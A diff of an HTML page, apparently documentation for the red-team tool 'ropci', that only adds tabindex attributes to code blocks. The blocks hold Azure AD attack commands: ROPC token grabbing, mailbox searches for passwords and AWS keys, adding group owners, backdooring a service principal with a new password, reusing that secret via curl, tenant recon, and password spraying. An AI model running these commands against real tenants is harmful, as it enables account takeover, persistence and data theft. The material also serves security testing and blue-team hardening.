@@ -153,7 +153,7 @@
 <h2 id="getting-an-access-token">Getting an Access Token</h2>
 <p>First, run <code>ropci configure</code> to setup the environment. It requires tenant name, username and password.</p>
 <p>Afterwards <code>./ropci auth logon</code> will get you an accesss token if ROPC auth is possible:</p>
-<pre><code>$ ./ropci auth logon 
+<pre tabindex="0"><code>$ ./ropci auth logon 
 Succeeded. Token written to .token.
 </code></pre><ul>
 <li>
@@ -179,15 +179,15 @@ Succeeded. Token written to .token.
 </ul>
 <p>For instance, the <code>Microsoft Whiteboard Client</code> allows sending of emails via <code>./ropci mail send</code>.</p>
 <p>To switch to a different <code>clientid</code> the following command can be used:</p>
-<pre><code>./ropc auth logon --clientid 57336123-6e14-4acc-8dcf-287b6088aa28`.
+<pre tabindex="0"><code>./ropc auth logon --clientid 57336123-6e14-4acc-8dcf-287b6088aa28`.
 </code></pre><h2 id="basic-info-about-a-user">Basic info about a user</h2>
 <p>Show some interesting info about a user (by default logged on user is used):</p>
-<pre><code>./ropci users who [-u joe@example.org]
+<pre tabindex="0"><code>./ropci users who [-u joe@example.org]
 </code></pre><p>This will list details about the user and group ownerships and group memberships.</p>
 <h2 id="enumerating-and-evaluating-apps">Enumerating and evaluating apps</h2>
 <p>In case you got an access token it is  a good idea to enumerate all the OAuth apps that are registered for a tenant.</p>
 <p>To do this for all OAuth2 apps (so called servicePrincipals in AAD) use <code>./ropci apps list</code>:</p>
-<pre><code>$ ./ropci apps list
+<pre tabindex="0"><code>$ ./ropci apps list
 +----------------------------------------------------------------+--------------------------------------+--------------------+
 |                          displayName                           |                appId                 |   publisherName    |
 +----------------------------------------------------------------+--------------------------------------+--------------------+
@@ -202,7 +202,7 @@ Succeeded. Token written to .token.
 | SubscriptionRP                                                 | e3335adb-5ca0-40dc-b8d3-bedc094e523b | Microsoft Services |
 .....
 </code></pre><p>There are likely more then 100 apps in your tenant. <code>ropci</code> will only show you 100 entries by default. Use the <code>--all</code> argument when calling the command to list everything, you can also output all the details as <code>json</code>.</p>
-<pre><code>./ropci apps list --all --format json -o apps.json
+<pre tabindex="0"><code>./ropci apps list --all --format json -o apps.json
 </code></pre><h2 id="perform-a-bulk-authentication-validation">Perform a bulk authentication validation</h2>
 <p>To test all your applications:</p>
 <ol>
@@ -210,10 +210,10 @@ Succeeded. Token written to .token.
 <li>Perform an ROPC based logon for each of them to see which one allow ROPC (using <code>./ropci auth bulk</code>)</li>
 </ol>
 <p>These are the commands:</p>
-<pre><code>./ropci apps list --all --format json | jq -r '.value[] | [.displayName,.appId] | @csv' &gt; apps.csv
+<pre tabindex="0"><code>./ropci apps list --all --format json | jq -r '.value[] | [.displayName,.appId] | @csv' &gt; apps.csv
 ./ropci auth bulk -i apps.csv -o output.json
 </code></pre><p>Here is an example:</p>
-<pre><code>$ ./ropci apps list --all --format json | jq -r '.value[] | [.displayName,.appId] | @csv' &gt; apps.csv
+<pre tabindex="0"><code>$ ./ropci apps list --all --format json | jq -r '.value[] | [.displayName,.appId] | @csv' &gt; apps.csv
 $ ./ropci auth bulk -i apps.csv -o results.json
 ClientIDs from CSV file apps.csv.
 Results will be written to results.json.
@@ -256,9 +256,9 @@ The result file will already contain the retrieved <code>access_tokens</code> fr
 <p>It&rsquo;s also a good list for the IT admins and blue team to monitor and lock down.</p>
 <h2 id="search-the-users-mail-messages">Search the user&rsquo;s mail messages</h2>
 <p>By default the following searches for the word <code>password</code>:</p>
-<pre><code>./ropci search
+<pre tabindex="0"><code>./ropci search
 </code></pre><p>But you can specify a custom query with <code>-q</code>. Here is an example:</p>
-<pre><code> ./ropci search -q 'AWS_ACCESS' -f rank -f summary
+<pre tabindex="0"><code> ./ropci search -q 'AWS_ACCESS' -f rank -f summary
 +------+-----------------------------------------------------------------------------------------------------------------------------------------------------------+
 | rank |                                                        summary                                                                                            |
 +------+-----------------------------------------------------------------------------------------------------------------------------------------------------------+
@@ -270,11 +270,11 @@ Number of items: 1
 </code></pre><p>Pretty neat.</p>
 <p>You can also search for other items, like Sharepoint listItems, etc.. by specifying <code>-t</code> and the type.</p>
 <h2 id="list-all-groups">List all groups</h2>
-<pre><code>./ropci groups list --format json -o groups.json
+<pre tabindex="0"><code>./ropci groups list --format json -o groups.json
 cat groups.json | jq -r '.value[].id'
 </code></pre><h2 id="list-membersowners-of-a-groups">List members/owners of a groups</h2>
 <p>To list the members of a group, first get the groupid via the previous group list command, then run:</p>
-<pre><code>./ropci groups members-list -g 68af7cb2-551f-4d99-9959-a1bede7ac1e0
+<pre tabindex="0"><code>./ropci groups members-list -g 68af7cb2-551f-4d99-9959-a1bede7ac1e0
 +--------------------------------------+------------------+-------------------------+-----------+-----------+------------+----------+----------------+
 |                  id                  |   displayName    |    userPrincipalName    | givenName |  surname  | department | jobTitle | accountEnabled |
 +--------------------------------------+------------------+-------------------------+-----------+-----------+------------+----------+----------------+
@@ -286,30 +286,30 @@ Number of items: 2
 </code></pre><p>Similar command exists for owernship checks via <code>./ropci groups owners-list</code>.</p>
 <h2 id="add-an-owner-to-a-group">Add an owner to a group</h2>
 <p>List or add an owner of a group:</p>
-<pre><code>./ropci groups owner-list -g 68af7cb2-551f-4d99-9959-a1bede7ac1e0
+<pre tabindex="0"><code>./ropci groups owner-list -g 68af7cb2-551f-4d99-9959-a1bede7ac1e0
 ./ropci groups owner-add -u 0df463da-1a1c-4dba-817d-ca72438524ce -g 68af7cb2-551f-4d99-9959-a1bede7ac1e0
 </code></pre><p>Removing works also.</p>
 <h2 id="search-for-usersgroups">Search for users/groups:</h2>
-<pre><code>./ropci users list -s userPrincipalName:bob
+<pre tabindex="0"><code>./ropci users list -s userPrincipalName:bob
 </code></pre><h2 id="upload-a-file-to-sharepoint">Upload a file to SharePoint</h2>
 <p>Uploading a file to SharePoint drive:</p>
-<pre><code>./ropci drive upload -p &quot;/Tom @ ExampleOrg, LLC/testing.txt&quot; -d ./ropci -v
+<pre tabindex="0"><code>./ropci drive upload -p &quot;/Tom @ ExampleOrg, LLC/testing.txt&quot; -d ./ropci -v
 </code></pre><h2 id="read-mail-in-text-form">Read mail in text form</h2>
 <p>The following command will show some basic info about the accounts inbox:</p>
-<pre><code>./ropci mail list
+<pre tabindex="0"><code>./ropci mail list
 </code></pre><p>Read mail body.content in text form:</p>
-<pre><code> ./ropci mail list --format json | jq .value[].body.content
+<pre tabindex="0"><code> ./ropci mail list --format json | jq .value[].body.content
 </code></pre><h2 id="invalidate-refresh-tokens">Invalidate Refresh Tokens</h2>
 <p>This is quite important in order to protect yourself:</p>
-<pre><code>./ropci auth invalidate
+<pre tabindex="0"><code>./ropci auth invalidate
 </code></pre><p>Which basically calls <code>/me/invalidateAllRefreshTokens</code>:</p>
-<pre><code>./ropci call -c /me/invalidateAllRefreshTokens --verb POST
+<pre tabindex="0"><code>./ropci call -c /me/invalidateAllRefreshTokens --verb POST
 </code></pre><p>If you try to refresh now with <code>./ropci auth refresh</code> the following error will be shown:</p>
-<pre><code>AADSTS50173: The provided grant has expired due to it being revoked, a fresh auth token is needed. The user might have changed or reset their password. The grant was issued on '2022-09-05T18:48:10.7367392Z' and the TokensValidFrom date (before which tokens are not valid) for this user is '2022-09-05T18:48:54.0000000Z'
+<pre tabindex="0"><code>AADSTS50173: The provided grant has expired due to it being revoked, a fresh auth token is needed. The user might have changed or reset their password. The grant was issued on '2022-09-05T18:48:10.7367392Z' and the TokensValidFrom date (before which tokens are not valid) for this user is '2022-09-05T18:48:54.0000000Z'
 </code></pre><p>Refresh tokens have been invalidated for the logged on user. If the account has the right permissions one can also call <code>/users/username@expample.org/invalidateAllRefreshTokens</code> to invalidate refresh tokens of another account.</p>
 <h2 id="application-role-assignments-of-a-user">Application Role Assignments of a user</h2>
 <p><a href="https://docs.microsoft.com/en-us/graph/api/user-list-approleassignments?view=graph-rest-beta&amp;tabs=http">Graph API Documentatin</a></p>
-<pre><code>./ropci call -c /users/user@example.org/appRoleAssignments -f id -f principalDisplayName -f resourceDisplayName -f resourceId
+<pre tabindex="0"><code>./ropci call -c /users/user@example.org/appRoleAssignments -f id -f principalDisplayName -f resourceDisplayName -f resourceId
 +---------------------------------------------+----------------------+-------------------------+--------------------------------------+
 |                     id                      | principalDisplayName |   resourceDisplayName   |              resourceId              |
 +---------------------------------------------+----------------------+-------------------------+--------------------------------------+
@@ -318,7 +318,7 @@ Number of items: 2
 | 5c6Mg23JVUWFS5E9XaB_vaBGH-RIpJRMuE0qYZ7s5ZE | Vera Mitchell        | AppForHealthServices    | 48359af7-af3a-42d4-abe2-8425a14689c9 |
 +---------------------------------------------+----------------------+-------------------------+--------------------------------------+
 </code></pre><h2 id="backdooring-a-service-principal-adding-additional-password">Backdooring a Service Principal (adding additional password)</h2>
-<pre><code>$ ./ropci call -c /servicePrincipals/48359af7-af3a-42d4-abe2-8425a14689c9/addPassword \ 
+<pre tabindex="0"><code>$ ./ropci call -c /servicePrincipals/48359af7-af3a-42d4-abe2-8425a14689c9/addPassword \ 
 --verb POST  -b '{&quot;passwordCredential&quot;: { &quot;displayName&quot;: &quot;ropci says this is fine&quot;}} | jq
 
 {
@@ -334,22 +334,22 @@ Number of items: 2
 }
 </code></pre><p>Take note of the response, and the <code>secretText</code>. This is what can be used to impersonate the service principal.</p>
 <p>With that <code>secretText</code>, which is the <code>client_secret</code> you can get an access token via the OAuth2 <code>client_credential</code> flow:</p>
-<pre><code>curl -d 'grant_type=client_credentials&amp;client_id=2581d8b8-2e9c-4374-a418-06f9cfed87ff&amp;client_secret=Yhj8Q~H1np.....4iEGuf0djD&amp;scope=https://graph.microsoft.com/.default' https://login.microsoftonline.com/wuzzi.onmicrosoft.com/oauth2/v2.0/token
+<pre tabindex="0"><code>curl -d 'grant_type=client_credentials&amp;client_id=2581d8b8-2e9c-4374-a418-06f9cfed87ff&amp;client_secret=Yhj8Q~H1np.....4iEGuf0djD&amp;scope=https://graph.microsoft.com/.default' https://login.microsoftonline.com/wuzzi.onmicrosoft.com/oauth2/v2.0/token
 </code></pre><p>Fun times!</p>
 <h2 id="more-useful-recon-commands">More useful recon commands</h2>
 <h3 id="chats">Chats</h3>
-<pre><code>./ropci call -c /me/chats
+<pre tabindex="0"><code>./ropci call -c /me/chats
 </code></pre><h3 id="searching-for-other-items-eg-person">Searching for other items (e.g person)</h3>
-<pre><code>./ropci search -t person -q &quot;ropci&quot; --format json  | jq
+<pre tabindex="0"><code>./ropci search -t person -q &quot;ropci&quot; --format json  | jq
 </code></pre><h2 id="generic-call-method">Generic call method</h2>
 <p>The <code>call</code> command allows to invoke the many other APIs that are exposed. Here are a couple of interesting examples:</p>
-<pre><code>./ropci call -c /domains --format json -o domains.json
+<pre tabindex="0"><code>./ropci call -c /domains --format json -o domains.json
 ./ropci call -c /domains/{tenant}}/verificationDnsRecords --format json -o verificationDnsRecords-domain1.json
 ./ropci call -c /organization --format json -o organization.json
 ./ropci call -c /identity/conditionalAccess/policies --format json -o conditionalAccess-Policies.json
-</code></pre><pre><code>./ropci call -c '/identity/b2cUserFlows/B2C_test_signin_signup/userflowIdentityProviders'
+</code></pre><pre tabindex="0"><code>./ropci call -c '/identity/b2cUserFlows/B2C_test_signin_signup/userflowIdentityProviders'
 </code></pre><h3 id="explore-authentication-methods">Explore authentication methods</h3>
-<pre><code>./ropci auth logon --clientid 27922004-5251-4030-b22d-91ecd9a37ea4 # Use Outlook Mobile clientID
+<pre tabindex="0"><code>./ropci auth logon --clientid 27922004-5251-4030-b22d-91ecd9a37ea4 # Use Outlook Mobile clientID
 ./ropci call -c '/me/authentication/methods' -f id -f  emailAddress --format json | jq
 
 ./ropci call -c '/me/authentication/phoneMethods' -f id -f phoneNumber -f phoneType
@@ -360,7 +360,7 @@ Number of items: 2
 </code></pre><h3 id="list-deleted-users-or-other-deleted-items">List deleted users or other deleted items</h3>
 <p>When an object (e.g. user account) is deleted, it&rsquo;s not entirely deleted right away. It&rsquo;s possible to restore them within 30 days.
 The following command lists the delete users:</p>
-<pre><code>./ropci call -c /directory/deletedItems/microsoft.graph.user
+<pre tabindex="0"><code>./ropci call -c /directory/deletedItems/microsoft.graph.user
 +--------------------------------------+-------------+------+
 |                  id                  | displayName | name |
 +--------------------------------------+-------------+------+
@@ -369,7 +369,7 @@ The following command lists the delete users:</p>
 +--------------------------------------+-------------+------+
 </code></pre><h2 id="password-spraying">Password Spraying</h2>
 <p>ropci also comes with the ability to perform an ROPC based password spray.</p>
-<pre><code>./ropci auth spray --users-file users.list --passwords-file passwords.list -o result --wait 60 --wait-try 10 
+<pre tabindex="0"><code>./ropci auth spray --users-file users.list --passwords-file passwords.list -o result --wait 60 --wait-try 10 
 Attempts: 12 for ClientID d3590ed6-52b3-4102-aeff-aad2292ab01c
 
 Attempt 0001: alice@wunderwuzzi.net                     test1242355                     invalid username or password
